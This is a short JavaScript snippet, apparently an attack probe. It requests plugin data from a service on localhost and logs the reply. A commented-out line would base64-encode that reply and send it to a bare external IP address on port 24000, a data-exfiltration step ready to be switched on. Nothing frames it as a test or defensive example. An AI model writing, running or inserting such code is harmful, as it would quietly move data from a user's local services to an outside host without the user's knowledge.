const url4 = 'https://localhost/show-plugins';

// Making a GET request using fetch()
fetch(url4)
  .then(response => {
    return response.json();
  })
  .then(data => {
    console.log("Here is the data");
    console.log(data);
    //fetch("http://82.65.210.151:24000/?encodedData=" + btoa(data));
  })
  .catch(error => {
    console.log("error");
  });
